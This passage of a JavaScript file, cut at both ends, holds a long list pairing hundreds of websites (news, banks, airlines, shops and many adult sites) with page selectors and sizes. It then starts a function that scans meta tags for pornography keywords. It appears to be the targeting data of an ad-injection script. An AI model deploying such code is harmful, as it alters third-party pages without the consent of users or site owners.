sectionMain"]*250**muaban.net*div[id^="dvContent"]*250**vuigame.vn*div[id^="homepage-top"]*90**vnreview.vn*div[id^="column-2"]*250**tiin.vn*div[id^="middle-body"]*250**home.vn*div[class^="other-news-left-style"]*200**vietjetair.com*div[id^="content"]*90**www.vietnamairlines.com*div[class^="bg-white"]*90**saostar.vn*div[class^="list_vertical_news"]*250**sextop1.net*div[id^="content"]*200**xemvtv.net*div[id^="pages"]*200**www.mibet.com*div[class^="content-bottom"]*200**www.vietnamplus.vn*section[class^="extra-contents"]*200**chiasenhac.vn*table[class^="page-dsms"]*200**bestie.vn*div[class^="page-detail"]*90**bestie.vn*div[class^="row bdt"]*200**www.tienphong.vn*main[id^="page-home"]*90**quantrimang.com*div[class^="content-detail"]*200**quantrimang.com*div[class^="navbox sidenav"]*600**laodong.com.vn*div[class^="clearfix video-box"]*200**nhattao.com*div[class^="mainContent withTransition"]*250**gamevui.vn*div[class^="wbox mageta hottags"]*200**www.bong99.com*section[class^="home-page"]*90**baodatviet.vn*div[id^="photoslide"]*250**vietbao.vn*div[class^="module mod-gocnhin left1"]*600**vietbao.vn*div[id^="con2"]*200**laban.vn*li[id^="home_directory_4"]*250**fptshop.com.vn*div[class^="detail-container"]*250**fptshop.com.vn*div[class^="row main-content"]*200**talktv.vn*div[class^="section-news top-news-block"]*200**kienthuc.net.vn*div[class^="feature clearfix parentbox"]*90**bongdaso.com*div[id^="firstbox"]*200**123doc.org*div[id^="dtm"]*200**www.baoventd.com*div[class^="box_news_hot"]*200**truykich.vn*div[class^="left"]*250**www.foody.vn*div[class^="content-container"]*250**healthplus.vn*div[class^="module-cnt pkg"]*250**www.bongda.com.vn*div[class^="breadcump"]*250**vlxx.tv*div[id^="video"]*250**nld.com.vn*div[class^="contenttotal"]*250**pose.com.vn*div[id^="bottomTiles"]*200**video.vitalk.vn*.related-with-list*600**vitalk.vn*div[id^="recentNews"]*200**download.com.vn*div[id^="page"]*200**www.sendo.vn*div[id^="recommend-women"]*250**cafef.vn*div[class^="top_noibat_row2"]*250**anime47.com*div[class^="last-film-box-wrapper"]*200**chimsedinang.com*.video-yeuthich*200**www.thuocbietduoc.com.vn*div[id^="neo-container"]*90**sinhvienit.net*div[id^="homecategory"]*400**congan.com.vn*div[id^="owl-articles"]*200**www.docxem.com*div[class^="entry_content"]*250**vothuat.vn*div[class^="entry-content"]*250**www.careerlink.vn*div[class^="job-side-data"]*400**www.careerlink.vn*div[class^="list-group list"]*200**vatgia.com*div[id^="vatgia_home_v4"]*90**www.thegioididong.com*div[class^="box_content"]*250**www.thegioididong.com*ul[class^="homeproduct"]*90**www.388bet.com*div[class^="step-3 container"]*90**phim14.net*div[id^="content"]*90**blogtamsu.vn*div[class^="bnlwl-special-wrapper"]*200**360game.vn*div[id^="new-game"]*200**www.nhaccuatui.com*div[class^="list_album"]*200**xehoiviet.com*div[class^="medium-7 columns"]*200**nhadatso.com*div[class^="bds_list"]*200**us.24h.com.vn*div[class^="padTB5 padR5"]*250**news.zing.vn*section[class^="main"]*250**news.zing.vn*section[id^="nhip-song"]*250**news.zing.vn*section[id^="song-tre"]*250**news.zing.vn*section[id^="the-thao"]*250**www.anime-th.com*.td-pb-span8*250**www.rakjung.com*div[class^="col-md-9"]*250**uouso.com*div[class^="col-sm-8 main-content"]*250**getgameth.com*div[id^="main-content"]*250**myreadyweb.com*div[id^="content"]*200**www.nice3anime.com*div[id^="themepacific_infinite"]*200**pattayaone.news*.td-pb-span8*200**www.mygame.in.th*div[id^="tabs-1"]*250**cherry-porn.com*div[id^="content"]*250**smailehi.com*div[id^="content"]*250**www.lovenayou.com*div[class^="tt_left grid"]*250**www.bigc.co.th*div[class^="home-layout-banners"]*250**www.kidjarak.com*div[class^="td-main-content-wrap"]*90**spiceee.net*div[class^="main-area main-area_home"]*200**www.doctor.or.th*div[class^="attachment attachment-after"]*250**thumbsup.in.th*div[class^="featured-articles"]*250**dujav.com*div[class^="peliculas"]*250**www.cookiecoffee.com*div[id^="content"]*250**casino1988.net*div[id^="new-index-text"]*200**www.naibann.com*div[class^="td-main-content-wrap"]*90**www.kfc.co.th*div[class^="row promo"]*250**www.khaosodenglish.com*.td-pb-span8*200**www.pornthanks.com*div[align^="center"]*200**www.horoworld.com*div[class^="inner _self-ph10-mt10"]*200**www.egat.co.th*div[id^="content-top"]*200**okmovie-hd.com*div[class^="leftC"]*200**youpornxxxx.com*div[id^="suggestions"]*250**www.share-si.com*div[class^="container sp_sidebar"]*250**teaso.ru*div[class^="bitad"]*250**ok-like.net*div[id^="content"]*250**gameoverth.com*div[id^="diy1"]*250**hd.xxxunlockporn.com*div[id^="content"]*250**tsgclub.net*div[id^="rd_module_blog"]*250**www.thaihealth.or.th*div[class^="w_tab"]*250**positioningmag.com*div[id^="td_uid_47"]*250**www.one3up.com*div[id^="content"]*250**www.aripfan.com*.td-pb-span8*250*porn.newsexclub.com*div[id^="content"]*250**www2.thaiadmin.org*div[id^="boardindex_table"]*250**www.iphone-droid.net*div[class^="td_block_wrap td_block_14"]*250**ballnaja.com*div[class^="center"]*200**www.trekkingthai.com*div[class^="col-8 main-content"]*200**goosiam.com*div[class^="col-md-12 hidden-xs hidden-sm"]*200**curse-hell.net*div[class^="wp cl w"]*90**www.037hd.tv*div[class^="leftC"]*250**www.isranews.org*section[id^="tm-top-a"]*250**adult.porn919.com*div[class^="entry-header cf"]*200**adult.porn919.com*div[class^="loop-content-m"]*200**www.ufocool.com*div[class^="jumbotron"]*90**www.gmthai.com*div[class^="home-game-pc J_lazy_bg"]*250**www.balltrue.com*div[id^="main-content"]*250**www.hallyukstar.com*div[class^="theiaStickySidebar"]*600**www.lyrics.im*div[id^="banner"]*250**www.thscore.cc*div[class^="hotTags"]*200**cia4opm.com*footer[id^="footer"]*250**cia4opm.com*div[id^="content"]*250**on.tubexxxonly.com*div[id^="content"]*250**palungjit.org*div[class^="mainContent"]*250**www.clipfasthd.com*div[id^="main-content"]*200**bangkok.craigslist.co.th*div[id^="center"]*200**www.winner.co.th*div[id^="foot"]*250**www.f0nt.com*div[id^="bottom"]*250**th.xxxnung.com*div[id^="content"]*250**clipsumo.com*div[id^="content"]*200**www.chilindo.com*div[class^="left_col"]*200**www.cmart.co.th*.slider-style1*200**www.myhora.com*div[class^="content_right"]*200**lionairthai.com*div[id^="mainTabs"]*200**techxcite.com*div[id^="cate-bar"]*200**108lakorn.com*div[id^="container"]*200**www.thaifriendly.com*div[class^="tab-content"]*250**v2.allurexxxclub.com*footer[id^="footer"]*250**v2.allurexxxclub.com*div[class^="nag cf"]*200**www.easypacelearning.com*div[class^="left_column"]*600**www.wtfintheworld.com*div[class^="td-ss-main-content"]*250**www.khonkaenlink.info*div[class^="table-responsive"]*200**bangkokair.com*div[class^="bg-cross"]*90**www.meekhao.com*main[id^="content"]*200**naewna.com*div[class^="hotnews linklist pagebutton"]*200**fifaaddict.com*div[id^="tvLatestFrontpage"]*200**www.smmsport.com*section[class^="latest-article-section"]*250**www.lakornhit.com*div[class^="col-left"]*200**www.metalbridges.com*div[id^="main"]*250**avcollectors.com*div[id^="ja-content"]*250**happyluketh.com*div[class^="inner cover"]*250**www.siamdrama.com*div[id^="sidebar"]*600**bectero.com*div[class^="row are"]*250**rabbit.co.th*section[class^="row tab-news-feed"]*250**xxxnaja.com*div[class^="main-content"]*250**www.polleidesignworks.com*div[class^="loop-nav pag-nav"]*250**www.yahmovie.com*div[id^="primary-home"]*250**www.one2car.com*div[class^="cycle--control-circle"]*200**www.series24hr.com*div[class^="lateral"]*600**kod-hd.com*div[class^="leftC"]*200**medthai.com*div[class^="slick-list draggable"]*200**www.macthai.com*div[id^="content"]*250**www.vojkud.com*div[class^="peliculas"]*250**icwutudidare.info*div[id^="images"]*250**www.thaijobsgov.com*div[id^="left-sidebar"]*90**www.bangkokbiznews.com*div[class^="section_6 photo_gallery"]*200**rock-anime.com*div[class^="panel-body"]*90**miko-anime.com*div[class^="panel-body"]*90**www.clipmass.com*div[class^="staff-picked"]*200**xxxpostpic.org*div[class^="block980 whitebg"]*250**www.edtguide.com*div[class^="mask-col"]*200**www.toonclub-th.co*div[class^="panel panel-info"]*250**www.kaazip.com*div[class^="td-ss-main-content"]*250**www.expedia.co.th*div[id^="promo-deals-module"]*250**www.orztoon.co*div[class^="box_item"]*200**m.kku.ac.th*div[class^="ui-content"]*90**mx7.com*div[id^="content-section"]*90**www.series-onlines.com*div[class^="leftC"]*250**www.tunwalai.com*div[id^="main-content-news-update"]*250**www.ko-anime.com*section[class^="tt-l tt-full sec_ct"]*200**www.onlinethailand.net*div[class^="contact-left"]*200**www.kanomjeeb.com*div[class^="article no-padding"]*90**www.bestmovie-hd.com*div[class^="filmcontent"]*200**www.nokair.com*div[id^="dialog-message"]*250**www.yellowpages.co.th*div[class^="col-md-12 col-xs-12 homepage-last"]*250**adultok.xclubporn.com*div[id^="content"]*250**xclubporn.com*footer[id^="footer"]*250**www.jib.co.th*div[class^="panelwidget"]*250**www.scb.co.th*div[id^="container-main"]*90**www.moph.go.th*div[class^="row box-main-1"]*90**taladrod.com*div[id^="body_container"]*200**www.thaiseoboard.com*div[id^="mainbody-padding"]*200**www.chillpainai.com*div[class^="row image-box style1"]*200**www.ddproperty.com*section[class^="secondary-sticky-bar"]*90**www.9nung.com*section[id^="content"]*200**www.jeban.com*div[class^="activities-wrapper"]*250**www.cmu.ac.th*div[id^="tabs-1"]*90**www.pantipmarket.com*div[id^="pmk_search_bar_box"]*250**www.watchlakorn.in*div[class^="section_left"]*90**www.sayhibeauty.com*aside[id^="randompostwidget-2"]*600**www.tvpoolonline.com*div[class^="article"]*200**sistacafe.com*div[id^="home"]*90**sistacafe.com*div[id^="rightside"]*600**www.siamphone.com*div[id^="phone_review"]*250**www.box-manga.com*div[class^="panel panel-info"]*250**ent.jarm.com*div[class^="row news-bottom3"]*400**www.gangzabaaball.com*div[class^="page-header page-header-1"]*250**www.gangzabaaball.com*section[name^="news-hot-today"]*90**ch7.com*div[class^="drama_box "]*200**liekr.com*div[class^="left box"]*250**www.siamzone.com*.uk-margin-top-remove*200**www.chula.ac.th*div[id^="section-news"]*200**www.wongnai.com*div[class^="search-result row"]*200**www.dedbit.com*td[class^="news"]*200**www.exness.com*div[class^="main-content"]*90**www.komchadluek.net*div[id^="rowbox-news"]*200**www.majorcineplex.com*div[class^="listblogMovies"]*200**kaijeaw.com*div[id^="left-sidebar"]*250**www.warpfootball.com*div[class^="col-sm-4"]*600**postto.me*div[class^="row content-row"]*90**www.genfb.com*div[id^="sidebar"]*600**www.prachachat.net*div[class^="vc_row td_uid_13"]*250**pokezz.com*div[class^="col s12 m9 l10"]*250**www.blognone.com*div[id^="block-system-main"]*250**www.ku.ac.th*div[class^="gtt-block-free free-box"]*90**natnaree22.exteen.com*#sidebar*600**ratemyserver.net*div[class^="contentwrap"]*200**www.set.or.th*div[class^="col-md-12 padding-0"]*90**www.posttoday.com*div[id^="newsclear"]*250**www.posttoday.com*div[id^="newsclear"]*250**www.spokedark.tv*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**www.igdara.in.th*div[class^="infoMain"]*250**petmaya.com*div[class^="vc_column-inner"]*250**www.tarad.com*div[id^="product-detail"]*250**www.tarad.com*div[class^="headline_box"]*250**mahidol.ac.th*section[id^="middle"]*90**www.oremanga.com*div[class^="ore-manga-update-zone"]*200**store.ais.co.th*div[class^="category-products"]*250**www.priceza.com*div[id^="home-specials"]*90**www.pokerstars.com*div[class^="highlight-grid bgStyle12"]*90**www.pokerstars.com*div[class^="promo-grid-legacy bgStyle1"]*200**www.thaiairways.com*div[class^="ls-row mainpage"]*250**www.thaiairways.com*div[id^="ls-gen15663675-ls-col-body"]*250**www.thaiairways.com*div[class^="ls-row row-fluid newsandhl"]*90**dailynews.co.th*section[id^="highlight-section"]*250**oknation.nationtv.tv*div[id^="center_column_data"]*250**oknation.nationtv.tv*div[id^="set2"]*90**www.moviehd-free.com*div[class^="filmborder"]*200**thaivisa.com*div[class^="clearfix add_marg_top"]*90**postjung.com*div[id^="maincontent"]*200**portal.weloveshopping.com*div[class^="lvd-shop-info"]*90**portal.weloveshopping.com*div[class^="h-dealzapp-box"]*250**www.soccersuck.com*div[class^="post_panel_td post_panel_td_right"]*250**www.trueinternet.co.th*div[class^="col-sm-9"]*90**www.trueinternet.co.th*div[class^="section section-gray"]*90**www.clips4sale.com*div[id^="randomCat"]*200**www.nudevista.com*div[id^="listing"]*200**www.cam4.com*div[id^="main-content"]*200**www.porn.com*div[id^="player"]*200**www.flirt4free.com*div[id^="live_models"]*200**chaturbate.com*div[id^="defchat"]*200**chaturbate.com*div[class^="c-1 endless_page_template"]*200**tour.naughtyamerica.com*div[id^="white-wrapper"]*250**www.pornjam.com*div[class^="box-listados"]*250**adultinc.com*div[class^="video-list"]*250**jerkok.net*div[class^="panel panel-default"]*250**tubeq.xxx*div[class^="contents cf"]*250**porndope.com*div[class^="list-thumbs"]*250**neathdporn.com*ul[class^="thumbs-items"]*250**www.dirtydirtyangels.com*div[class^="tab-content"]*250**www.dirtydirtyangels.com*div[id^="content"]*250**blow-jobs.me*div[class^="cblow41363b3bff"]*250**www.xvicious.com*div[class^="inner-box-container"]*250**www.hotwettube.com*div[id^="player"]*250**www.faptube.com*div[class^="thumbs-hold"]*250**castingcouch-x.com*div[class^="jumbotron visible-lg"]*250**www.nudebeachpussy.com*div[id^="main-content"]*250**www.orgasm.com*div[class^="lvp-container-bg"]*250**wowgirls.tv*div[id^="main-content"]*250**www.puffynetwork.com*div[id^="video_container"]*250**www.pornblade.com*div[class^="videos cf"]*250**pornprosnetwork.com*div[id^="intro"]*250**bangbus.com*div[class^="player-out clearfix"]*250**www.vid2c.com*div[class^="thumbs"]*250**www.submityourflicks.com*main[class^="bg-mct3"]*250**www.pornworms.com*div[class^="tab-content"]*250**www.pornworms.com*div[id^="content"]*200**www.lesbian8.com*div[class^="tab-content"]*250**www.lesbian8.com*ul[class^="videos videosf"]*250**www.lesbianpornvideos.com*div[class^="thumb-list ac"]*250**fapdu.com*div[id^="upper-video"]*250**fapdu.com*div[id^="search-top"]*250**pornmaki.com*div[class^="video-page-wrap clearfix"]*250**www.madthumbs.com*div[id^="main"]*200**www.sexyhub.com*div[class^="paper-tiles latestScenes"]*250**crocotube.com*div[class^="smovies-list"]*250**www.daporn.com*div[class^="video-player started"]*250**www.daporn.com*div[class^="page-body listing-videos"]*250**fapxl.com*div[class^="span8"]*200**fapxl.com*div[id^="home-recent"]*250**www.hd-easyporn.com*section[class^="backg v_s"]*250**www.hd-easyporn.com*div[class^="videos cf"]*250**porn5.com*div[class^="c-1"]*250**porn5.com*ul[class^="list"]*250**www.tonightsgirlfriend.com*div[id^="content"]*250**freepornvs.com*div[id^="content"]*250**www.worldsex.com*div[class^="currently-videos"]*250**sex3.com*ul[class^="thumbs thumbs200"]*250**passion-hd.com*div[class^="jumbotron visible-lg"]*250**www.4sex4.com*div[class^="row videoThumbs"]*250**www.3movs.com*div[class^="player-holder"]*250**www.lobstertube.com*ul[class^="thumbs container"]*250**www.hardsextube.com*div[id^="video-interaction"]*250**www.hardsextube.com*div[class^="list-wrap scrollable"]*250**www.fux.com*div[id^="mainVideos"]*250**h2porn.com*div[class^="list-videos"]*250**pornharmony.com*div[id^="video_list"]*250**www.slutload.com*div[class^="playerNads clearfix"]*250**straight.aebn.net*div[id^="mainColumn"]*250**xbabe.com*div[class^="block_player"]*250**xbabe.com*div[class^="popular-thumbs"]*250**www.21sextury.com*div[id^="scenePlayer_player"]*250**www.21sextury.com*div[id^="HomeSceneListLanding"]*250**www.alotporn.com*div[class^="media-block"]*250**www.alotporn.com*div[id^="list_videos_being_watched"]*250**www.hd21.com*div[class^="category-list-wrap"]*250**www.twistys.com*div[class^="updates-container clearfix video"]*250**pornsharing.com*section[class^="layout"]*250**www.hotmovies.com*div[id^="new_release_scroller"]*250**www.fetishshrine.com*div[class^="block popular-videos"]*250**yourlust.com*div[class^="block_content"]*250**www.bangbrosnetwork.com*div[class^="contentarea h-top padLR"]*250**xxxbunker.com*div[id^="listItems"]*250**hellporno.com*div[class^="block-videos"]*250**www.tryboobs.com*.videos*250**www.mofosnetwork.com*div[class^="content-wrapper clearfix"]*250**www.blacked.com*div[id^="container"]*250**www.pornoxo.com*div[id^="maincolumn"]*250**www.flirt4free.com*div[id^="chat_interface"]*250**www.sunporno.com*div[class^="video"]*250**www.sunporno.com*div[id^="sliderCom"]*250**www.porntube.com*.box*250**www.cumlouder.com*div[class^="video-promos"]*250**www.cumlouder.com*div[id^="lst-scenes-cum"]*250**www.4tube.com*.box*250**www.empflix.com*section[id^="vidPlayer"]*250**tour.playboyplus.com*section[class^="latest-updates"]*250**www.spankwire.com*div[id^="main-area"]*250**shooshtime.com*div[class^="left primary"]*250**www.fuq.com*ul[class^="thumbs container"]*250**tour.naughtyamerica.com*div[class^="content-main homepage"]*250**anyporn.com*div[class^="block-video"]*250**www.eporner.com*div[id^="div-search-results"]*250**www.tnaflix.com*div[id^="hideAd"]*250**www.perfectgirls.net*div[class^="container overflow-none"]*250**pornxs.com*div[class^="top-content"]*250**porngale.com*div[class^="block-bg"]*250**www.hustler.com*div[id^="latest_updates_carousel"]*250**www.xtube.com*section[id^="mainSection"]*250**www.thumbzilla.com*div[id^="contentWrapper"]*250**www.hustler.com*div[id^="main"]*250**egbo.com*div[class^="main"]*250**www.xnxx.com*div[id^="content"]*250**www.bravotube.net*div[class^="headline"]*250**faapy.com*div[class^="thumbs video"]*250**www.youporn.com*div[class^="promo-message"]*250**www.hclips.com*div[class^="mfaapy.com*div[class^="thumbs video"]*250**www.youporn.com*div[class^="promo-message"]*250**www.hclips.com*div[class^="main"]*250**www.brazzersnetwork.com*div[id^="container"]*250**www.xvideos.com*div[id^="content"]*250**www.redtube.com*div[id^="contentHolder"]*250**www.pornhub.com*div[class^="container "]*250**www.vporn.com*div[id^="content"]*250**xhamster.com*div[class^="boxC"]*250**spankbang.com*main[id^="container"]*250**pornhd.com*section[id^="pageContent"]*250**www.porn.com*div[class^="main l170"]*250**porn555.com*div[class^="main_container"]*250**www.jofogas.hu*div[class^="listing-content row"]*250**www.origo.hu*div[class^="news-wrap wrap-42-25-33 normal"]*250**www.hotnews.ro*div[class^="center_side"]*250**www.filmeserialeonline.org*div[class^="peliculas"]*250**www.vice.com*div[class^="grid-row-container"]*250**www.gsp.ro*div[class^="sectiune calup-stiri utile"]*250**edu.ro*div[class^="home-content"]*250**www.digi24.ro*div[class^="row box"]*250**www.livejasmin.com*div[id^="listpage_container"]*250**bongacams.com*div[id^="mls_container"]*250**www.olx.ro*div[id^="offeractions"]*400**fishki.net*div[class^="list-view fishki-post-list pshift"]*250**fb.ru*div[id^="main"]*250**www.ozon.ru*div[class^="bUniversalShelf"]*250**4pda.ru*article[id^="rv4ATRnR4IL"]*200**lenta.ru*div[class^="span8 js-main__content"]*250**www.wildberries.ru*div[id^="part-1"]*250**www.yaplakal.com*div[id^="content-inner"]*200**ria.ru*div[id^="anchor_2"]*250**www.drive2.ru*div[class^="c-block c-block--content"]*250**pikabu.ru*div[class^="page-story"]*250**www.drom.ru*div[class^="b-links b-links_width-full"]*200**www.txxx.com*div[class^="right-section"]*250**9gag.com*div[class^="badge-entry-collection"]*250**www.wattpad.com*main[id^="authentication-panel"]*90**www.roblox.com*div[id^="SignUpFormContainer"]*300**www.metrodeal.com*div[class^="deal ph"]*250**www.metrodeal.com*div[class^="best-deals ph no-border"]*250**yts.ag*div[class^="home-movies"]*250**www.olx.ph*div[class^="categories"]*200**www.reddit.com*div[class^="trending-subreddits-content"]*250**www.slideshare.net*section[id^="hp-featured"]*250**deped.gov.ph*div[id^="content-wrapper"]*250**www.watchonlinemovies.com.pk*div[id^="singlecont"]*250**www.watchonlinemovies.com.pk*div[id^="maincont"]*250**hec.gov.pk*div[id^="homepage-container"]*90**www.fiverr.com*section[class^="categories js-categories-bar-reveal"]*250**www.dawnnews.tv*main[class^="ml-0  ml-sm-2  pb-2"]*250**thepiratebay.org*nav[id^="navlinks"]*250**www.bbc.com*div[id^="story-content"]*250**www.espncricinfo.com*section[class^="col-one"]*800**www.espncricinfo.com*section[class^="col-three"]*600**nts.org.pk*div[class^="container container2 clearfix"]*250**www.express.pk*div[class^="last columnarstorey"]*250**www.express.com.pk*div[id^="epaper"]*250**www.olx.com.pk*div[id^="rightMenu"]*250**www.olx.com.pk*div[class^="halfgrid main clr pdingbott20 zero-margin-top"]*200**www.dawn.com*section[class^="widget  theme  widget-linkedimage  text-center  p-0  widget--transparent  border--top"]*250**www.daraz.pk*div[class^="featured-brands"]*250**www.urdupoint.com*div[class^="main_bar fl"]*200**tuoitre.vn*div[class^="left-side"]*200**thegioinoithat.com*div[class^="td-ss-main-sidebar"]*600**www.blogphongthuy.com*div[id^="main"]*250**thegioinoithat.com*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**guidegame.vn*div[class^="bordery"]*250**vietcombank.com.vn*div[id^="contents"]*250**vov.vn*div[id^="site-wrap"]*250**www.nguoiduatin.vn*div[class^="box-3-category box-category"]*250**trandaiquang.org*div[id^="inner"]*250**phimbathu.com*div[class^="right-content"]*250**phimbathu.com*div[class^="main-content"]*250**baodauthau.vn*div[class^="sidebar"]*400**tinhte.vn*div[id^="WidgetPageContents"]*250**www.blogger.com*div[id^="maia-main"]*250**bilutv.com*div[class^="most-view block"]*600**bilutv.com*div[id^="main-content"]*250**lazada.vn*section[class^="c-layout-container"]*200**mangvieclam.com*div[id^="page-contents"]*250**bloganchoi.com*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**24h.com.vn*div[class^="colCenter"]*250**www.daikynguyenvn.com*section[id^="headline-post"]*250**adf.ly*div[id^="main"]*250**www.hao123.com*div[id^="hao123-bodyct"]*250**news.sanook.com*article[id^="contentPrint"]*250**www.sanook.com*section[class^="sizing-border sec-joox"]*250**lazada*div[class^="c-recommendation recommendation c-recommendation_js_inited c-recommendation_rendered"]*250**pantip.com*div[id^="comments-jsrender"]*250**pantip.com*div[class^="slide-news-wrap"]*250**www.snapdeal.com*div[class^="bx-viewport"]*250**fmovies.is*div[class^="widget latest-movies"]*250**www.manoramaonline.com*div[class^="main-frame mal_container"]*250**www.popads.net*div[class^="main_bottom"]*250**www.wittyfeed.com*div[class^="coverStoryDiv "]*250**en.savefrom.net*div[id^="tab1"]*250**paytm.com*div[class^="col-md-12 mr30"]*250**paytm.com*div[class^="Geht"]*250**www.icicibank.com*div[class^="offer-items-wrapper clearfix"]*250**www.jabong.com*div[class^="row content-product"]*250**www.jabong.com*section[id^="catalog-product"]*200**www.jabong.com*div[class^="desk-sis-wrapper clearfix"]*250**www.ndtv.com*div[class^="hmpage_lhs"]*250**companies.naukri.com*div[class^="bodyCont cl"]*250**www.naukri.com*div[class^="lmrWrap wrap"]*250**www.rediff.com*div[id^="leftcontainer"]*250**torrentz2.eu*div[class^="HalfRAcceptableAds"]*250**twitter.com*div[class^="MomentHomeModule"]*800**twitter.com*div[class^="SidebarCommonModules"]*800**www.quora.com*div[id^="__w2_F2L47y4_actionable"]*250**www.hdfcbank.com*div[class^="homebanner_wrapper"]*250**uidai.gov.in*div[id^="main-content"]*250**www.hotstar.com*div[class^="tray-container-outer"]*250**stackoverflow.com*div[class^="inner-content"]*250**www.linkedin.com*div[class^="profile-detail"]*250**www.linkedin.com*div[class^="neptune-grid three-column ghost-animate-in"]*250**www.flipkart.com*div[class^="_6TvkbM"]*250**www.onlinesbi.com*div[id^="banking"]*250**egov.kz*div[class^="region region-content"]*250**egov.kz*div[class^="content front-page-content"]*250**www.ivi.ru*div[class^="inner-nav-wrapper js-watch-inner-nav"]*250**www.ivi.ru*section[id^="userVideos"]*250**rutracker.org*div[id^="forums_wrap"]*250**vseigru.net*table[id^="all"]*200**www.parimatch.kz*div[id^="z_content"]*200**traffic-media.co*div[id^="content"]*250**hh.kz*div[class^="index-main-wrapper"]*250**baskino.co*div[class^="inside"]*250**baskino.co*div[id^="dle-content"]*250**satu.kz*div[class^="x-page__content x-page__content_padding_top"]*250**www.zakon.kz*article[id^="notsearch_area"]*250**kaspi.kz*section[id^="kaspiredSection"]*250**kaspi.kz*section[id^="startMainBanner"]*250**kinogo*div[class^="section"]*250**www.olx.kz*section[id^="body-container"]*250**www.nur.kz*div[class^="con rabota"]*250**www.bing.com*div[id^="recContainer"]*200**www.bing.com*div[id^="mmComponent_images_1"]*250**www.gazeta.ru*div[id^="ltop"]*250**coccoc.com*div[id^="control-slider"]*90**coccoc.com*div[class^="tv-query-list clear"]*300**www.tumblr.com*div[class^="dash_b_form_header"]*90**translate.google*div[id^="gt-src-p"]*60**translate.google*div[id^="gt-res-data"]*60**twitter.com*div[class^="Footer module roaming-module"]*800**www.twitch.tv*ul[class^="tabbed-split ember-view"]*250**www.twitch.tv*div[class^="fullwidth_main front_page"]*250**mail.ru*div[class^="wrapper"]*90**liga.net*div[class^="left_part"]*800**vtv.vn*div[class^="video_live clearfix"]*250**taimienphi.vn*div[class^="lstntop"]*250**vnexpress.net*div[class^="block_home_new"]*250**www.daikynguyenvn.com*div[class^="post-head"]*250**www.daikynguyenvn.com*div[class^="box-content headline-posts"]*250**www.webtretho.com*div[class^="postrow"]*300**www.webtretho.com*div[class^="ati_nwp_tieu_diem"]*250**www.catdumb.com*div[id^="td_uid_2"]*250**www.upyim.com*section[id^="home7"]*250**www.upyim.com*div[id^="sidebar_scoll_lock"]*600**tlcthai.com*div[id^="secondary"]*600**tlcthai.com*section[id^="drama"]*250**www.bangkokbank.com*div[id^="divRightContent"]*90**jarm.com*div[class^="layer-4"]*250**jarm.com*div[class^="layer-2"]*250**livehouse.in*div[class^="content grid-container"]*250**livehouse.in*div[class^="case-list"]*200**bloggang.com*div[id^="blog_detail"]*250**www.matichon.co.th*div[class^="td-container tdc-content-wrap"]*250**www.bing.com*div[id^="mainid"]*200**www.imdb.com*div[id^="main"]*300**www.imdb.com*div[id^="sidebar"]*600**mail.ru*div[class^="wrapper js-module"]*250**rutube.ru*div[class^="b-video__descr-wrapper"]*200**drom.ru*div[class^="b-right-side"]*800**drom.ru*div[class^="b-breadcrumbs"]*250**www.gismeteo.ru*div[class^="section__i"]*250**www.kinopoisk.ru*div[id^="content_block"]*200**www.kinopoisk.ru*div[id^="block_right"]*400**www.drive2.ru*div[class^="c-post__body js-gallery"]*250**craigslist*div[id^="center"]*240**craigslist*div[id^="leftbar"]*400**www.sahibinden.com*.special-categories*800**www.sahibinden.com*.classifiedDetailTitle*90**www.flipkart.com*div[class^="GQtpzo"]*250**www.flipkart.com*div[class^="_1fWl8W"]*600**www.rediff.com*div[id^="rightcontainer"]*800**www.rediff.com*div[class^="newrightcontainer"]*800**lazada*div[id^="prd-detail-page"]*250**lazada*div[class^="l-sidebar richRelevance__right"]*800**www.yallakora.com*div[class^="ArticleDetails"]*250**soundcloud.com*div[class^="badgeList m-twoRows lazyLoadingList"]*200**ask.fm*div[data-stick-to^=".sticky-anchor"]*600**www.youtube-mp3.org*#inner*250**imgur.com*div[class^="cards"]*200**www.walmart.com*div[class^="page-content-wrapper"]*250**www.nytimes.com*section[class^="inside-nyt"]*200**www.yelp.com*div[class^="clearfix layout-block layout-a"]*250**www.foxnews.com*section[id^="features-faces"]*250**www.booking.com*div[id^="basiclayout"]*250**www.booking.com*div[id^="basiclayout"]*250**onliner.by*div[class^="g-middle"]*250**worldoftanks*div[class^="promote-slider_holder"]*250**my-hit.org*div[class^="col-xs-12 center-block"]*300**www.olx.ua*section[id^="body-container"]*250**www.ukr.net*div[class^="szsumyljb"]*600**telegraf.com.ua*div[id^="mainWrapper"]*200**strana.ua*div[id^="main-right-column"]*600**znaj.ua*div[class^="top-menu-main"]*200**nv.ua*div[class^="right_column"]*600**from-ua.com*.no-left-margin*200**www.meteoprog.ua*div[class^="blockWeather"]*200**zakupka.com*div[id^="content"]*250**112.ua*div[class^="news-list"]*400**www.work.ua*div[class^="card card-indent"]*200**www.work.ua*.col-right*600**www.rbc.ua*aside[class^="sidebar-right"]*600**bigl.ua*div[id^="recommendations_products_list"]*200**rp5.ua*div[id^="extremeContent"]*200**en.vonvon.me*div[class^="list-block ng-scope"]*250**en.vonvon.me*div[class^="sidebar ng-scope"]*600**www.movie2free.com*div[class^="content-right"]*800**www.movie2free.com*div[class^="video-container"]*250**www.dek-d.com*div[id^="useful_section"]*250**www.newmovie-hd.com*div[class^="item-wrap clearfix"]*200**manager.co.th*div[class^=" sectionBox2"]*250**manager.co.th*div[id^="ais-sub-store"]*250**www.thairath.co.th*section[id^="headerContent"]*250**www.thairath.co.th*div[class^="row card fixtures"]*600**www.nungmovies-hd.com*div[class^="filmborder"]*200**www.nungmovies-hd.com*div[id^="sidebar"]*600**www.mobirum.com*div[id^="articleListArea"]*250**www.mobirum.com*section[id^="section_prereg_cafe"]*250**www.playpark.com*div[id^="pcgames"]*200**gordonua.com*div[id^="m_left"]*200**prom.ua*div[class^="x-page__content"]*250';
    var ad_pags = 'beeg.com*sex-news.ru*xxxalarm.com*sexrussia.tv';
    var kys_2 = function () {
        var arr = [' porn,', ' porno ', ' porno,', ' porn ', 'pornhub', '.xxx ', ' bravotube ', ' xvideos ', ' xhamster ', ' any porn', ' порно ', ' adult video', ' คลิปโป๊AV ดูหนังxฟรี ', ' หนังโป๊ ', 'คลิปโป๊', ' khiêu dâm ', ' sex online,', ' sex hd,', ' phim sex ', ' phim sex,', 'xvideos.com,'];
        var mts = document.querySelectorAll('meta');
        var title = document.querySelector('title');
        var arr_mts = [];
        mts.forEach(function (peas) {
            if (peas.getAttribute('name')) {
                var nm = peas.getAttribute('name').toLowerCase();
